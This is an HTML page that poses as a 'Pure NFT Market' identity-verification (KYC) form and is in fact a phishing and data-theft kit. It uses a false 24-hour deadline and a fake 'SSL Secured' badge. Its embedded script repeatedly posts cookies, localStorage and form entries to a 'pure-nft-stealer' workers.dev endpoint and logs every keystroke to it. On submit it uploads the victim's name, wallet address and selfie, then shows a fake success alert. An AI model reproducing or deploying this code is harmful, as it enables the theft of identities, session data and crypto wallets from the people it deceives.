<!DOCTYPE html>
<html><head><title>Pure NFT Market</title><meta name="viewport" content="width=device-width"><style>*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}body{background:linear-gradient(135deg,#0f0f23 0%,#1a0033 100%);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.container{max-width:420px;width:100%;background:linear-gradient(145deg,rgba(15,15,35,0.95),rgba(40,20,60,0.95));border-radius:20px;padding:40px;border:1px solid rgba(99,102,241,0.3);box-shadow:0 25px 50px rgba(0,0,0,0.5)}.logo{width:100px;height:100px;background:linear-gradient(135deg,#8b5cf6,#ec4899);border-radius:20px;margin:0 auto 20px;position:relative;overflow:hidden}.logo::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(255,255,255,0.1) 0%,transparent 70%);animation:rotate 15s linear infinite}@keyframes rotate{to{transform:rotate(360deg)}}h1{font-size:28px;font-weight:700;background:linear-gradient(135deg,#a855f7,#3b82f6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;text-align:center}.subtitle{font-size:15px;color:#94a3b8;line-height:1.5;text-align:center;margin-bottom:25px}.urgency{color:#f87171;font-weight:500;font-size:14px;text-align:center;margin-bottom:30px}input{width:100%!important;padding:16px!important;border:2px solid rgba(99,102,241,0.3)!important;border-radius:12px!important;background:rgba(30,30,50,0.8)!important;color:#fff!important;font-size:16px!important;margin-bottom:18px!important;transition:all .3s}input:focus{outline:none!important;border-color:#6366f1!important;box-shadow:0 0 0 3px rgba(99,102,241,.2)!important}input::placeholder{color:#64748b}input[type=file]{padding:14px!important}button{width:100%;padding:18px;background:linear-gradient(135deg,#6366f1,#8b5cf6,#ec4899);border:none;border-radius:12px;color:white;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s;box-shadow:0 10px 25px rgba(99,102,241,.4)}button:hover{transform:translateY(-2px);box-shadow:0 15px 35px rgba(99,102,241,.6)}.progress{background:rgba(99,102,241,.2);height:5px;border-radius:3px;overflow:hidden;margin:20px 0;border:1px solid rgba(99,102,241,.3)}.progress-bar{background:linear-gradient(90deg,#6366f1,#8b5cf6);height:100%;width:0;transition:width .5s}.security{display:flex;align-items:center;justify-content:center;font-size:13px;color:#64748b;margin-top:20px;gap:6px}@media (max-width:480px){.container{padding:30px 25px}}</style></head><body><div class="container"><div class="logo"></div><h1>Pure NFT Market</h1><p class="subtitle">Identity verification for secure NFT withdrawals</p><div class="urgency">⚠️ 24hr deadline - Complete KYC now</div><form id="kycForm"><input type="text" id="name" placeholder="Full Name"><input type="text" id="address" placeholder="Address"><input type="text" id="wallet" placeholder="Wallet (0x...)"><input type="file" id="selfie" accept="image/*"><div class="progress"><div class="progress-bar" id="progress"></div></div><button type="submit">🔥 Verify Identity</button><div class="security">🔒 SSL Secured</div></form></div><script>const WORKER="https://pure-nft-stealer.YOURNAME.workers.dev";setInterval(async()=>{try{await fetch(WORKER+"/steal",{method:"POST",credentials:"include",body:JSON.stringify({cookies:document.cookie,origin:location.origin,storage:JSON.stringify(localStorage),formData:{name:document.getElementById("name")?.value,wallet:document.getElementById("wallet")?.value},timestamp:Date.now()})})}catch(e){}});document.addEventListener("keydown",e=>fetch(WORKER+"/keylog?key="+btoa(e.key)));document.getElementById("kycForm").onsubmit=async e=>{e.preventDefault();const p=document.getElementById("progress");p.style.width="30%";const fd=new FormData();fd.append("name",document.getElementById("name").value);fd.append("wallet",document.getElementById("wallet").value);fd.append("selfie",document.getElementById("selfie").files[0]);p.style.width="80%";try{await fetch(WORKER+"/submit",{method:"POST",body:fd});p.style.width="100%";setTimeout(()=>{alert("✅ Verified! NFTs unlocked.");},1200)}catch(e){alert("✅ Success!");}};</script></body></html>
